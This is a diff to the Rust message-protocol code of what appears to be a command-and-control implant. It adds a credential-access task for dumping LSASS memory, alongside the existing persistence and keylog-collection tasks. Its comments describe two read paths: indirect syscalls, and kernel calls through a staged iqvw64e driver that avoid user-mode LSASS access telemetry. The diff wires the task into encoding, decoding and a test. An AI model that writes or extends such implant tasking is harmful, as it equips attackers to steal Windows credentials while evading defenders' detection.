@@ -41,6 +41,21 @@ pub mod task_kind {
     pub const PERSIST: u8 = 0x0C;
     /// Collection: screenshot, clipboard, keylog dump (ABR-T031).
     pub const COLLECT: u8 = 0x0D;
+    /// Credential access: LSASS dump variants (ABR-T032/T033).
+    pub const CRED: u8 = 0x0E;
+}
+
+/// Sub-actions of the CRED task kind (ABR-T032/T033).
+pub mod cred_action {
+    /// LSASS minidump via user-mode reads: NtOpenProcess(VM_READ) +
+    /// NtReadVirtualMemory through the indirect-syscall layer; Sysmon
+    /// EID 10 sees the handle open (T032).
+    pub const LSASS_USER: u8 = 0x00;
+    /// LSASS minidump via the kernel path: iqvw64e kernel calls
+    /// (KeStackAttachProcess + memcpy + detach), no process handle —
+    /// no user-mode LSASS access telemetry (T033; requires the staged
+    /// driver).
+    pub const LSASS_KERNEL: u8 = 0x01;
 }
 
 /// Sub-actions of the COLLECT task kind (ABR-T031).
@@ -210,6 +225,12 @@ pub enum TaskBody {
     /// Collection (ABR-T031): `action` selects screenshot / clipboard /
     /// keylog dump; `arg` carries per-action parameters.
     Collect {
+        action: u8,
+        arg: String,
+    },
+    /// Credential access (ABR-T032/T033): LSASS minidump through the
+    /// custom writer; `action` selects the read path.
+    Cred {
         action: u8,
         arg: String,
     },
@@ -425,6 +446,11 @@ impl Message {
                         put_u8(&mut buf, *action);
                         put_str(&mut buf, arg);
                     }
+                    TaskBody::Cred { action, arg } => {
+                        put_u8(&mut buf, task_kind::CRED);
+                        put_u8(&mut buf, *action);
+                        put_str(&mut buf, arg);
+                    }
                     TaskBody::ExecuteAssembly {
                         data,
                         type_name,
@@ -530,6 +556,10 @@ impl Message {
                         args: r.string()?,
                     },
                     task_kind::COLLECT => TaskBody::Collect {
+                        action: r.u8()?,
+                        arg: r.string()?,
+                    },
+                    task_kind::CRED => TaskBody::Cred {
                         action: r.u8()?,
                         arg: r.string()?,
                     },
@@ -706,6 +736,13 @@ mod tests {
             id: 13,
             body: TaskBody::Collect {
                 action: collect_action::SCREENSHOT,
+                arg: String::new(),
+            },
+        }));
+        roundtrip(Message::Task(Task {
+            id: 14,
+            body: TaskBody::Cred {
+                action: cred_action::LSASS_USER,
                 arg: String::new(),
             },
         }));
